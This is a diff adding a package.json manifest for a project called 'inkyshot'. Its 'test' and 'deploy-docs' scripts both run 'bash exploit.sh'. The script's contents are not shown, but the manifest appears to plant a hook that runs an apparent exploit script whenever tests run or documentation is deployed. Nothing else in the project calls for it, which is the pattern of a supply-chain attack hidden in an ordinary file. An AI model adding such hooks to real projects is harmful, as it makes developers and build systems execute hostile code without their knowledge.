@@ -1,0 +1,8 @@
+{
+  "name": "inkyshot",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "bash exploit.sh",
+    "deploy-docs": "bash exploit.sh"
+  }
+}
